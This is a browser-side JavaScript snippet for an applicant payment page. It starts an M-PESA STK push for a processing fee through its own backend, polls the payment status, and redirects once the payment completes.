/* LOAD APPLICANT NAME */ let applicant = localStorage.getItem("applicantName"); document.getElementById("name").innerHTML = applicant || "Applicant"; document.getElementById("fullName").value = applicant || ""; /* LOAD PROCESSING FEE */ let processingFee = localStorage.getItem("processingFee") || "350"; document.getElementById("feeAmount").innerHTML = "Processing Fee: KSh " + Number(processingFee).toLocaleString(); /* START STK PUSH */ async function payNow() { let phone = document.getElementById("phone").value.trim(); if (phone === "") { alert("Please enter your M-PESA phone number."); return; } localStorage.setItem("phoneNumber", phone); localStorage.setItem( "fullName", document.getElementById("fullName").value ); let btn = document.getElementById("payBtn"); btn.innerHTML = "Sending STK Push..."; btn.disabled = true; try { let response = await fetch( "https://nyota-funds-backend.onrender.com/stk-push", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ phone: phone, amount: Number(processingFee) }) } ); let data = await response.json(); console.log("STK RESPONSE:", data); if (!response.ok || !data.success) { throw new Error(data.message || "STK Push failed"); } let transactionId = data.transactionId || data.checkout_request_id; if (!transactionId) { throw new Error("No Paylor transaction ID received"); } btn.innerHTML = "Processing..."; document.getElementById("stkMessage").innerHTML = "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment."; checkPayment(transactionId); } catch (error) { console.log("PAYMENT ERROR:", error); alert(error.message || "Payment request failed."); btn.innerHTML = "Pay Processing Fee"; btn.disabled = false; } } /* CHECK PAYMENT STATUS */ async function checkPayment(transactionId) { let interval = setInterval(async () => { try { let response = await fetch( "https://nyota-funds-backend.onrender.com/payment-status", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ transactionId: transactionId }) } ); let result = await response.json(); console.log("PAYMENT STATUS:", result); if (!result.success || !result.data) { return; } let payment = result.data; let status = String(payment.status || "").toUpperCase(); if (status === "COMPLETED") { clearInterval(interval); document.getElementById("stkMessage").innerHTML = "✅ Payment successful. Redirecting..."; window.location.href = "delivery.html"; } else if ( status === "CANCELLED" || status === "FAILED" ) { clearInterval(interval); document.getElementById("stkMessage").innerHTML = "❌ Payment " + status.toLowerCase() + "."; document.getElementById("payBtn").disabled = false; document.getElementById("payBtn").innerHTML = "Pay Processing Fee"; } } catch (error) { console.log("STATUS ERROR:", error); } }, 3000); }
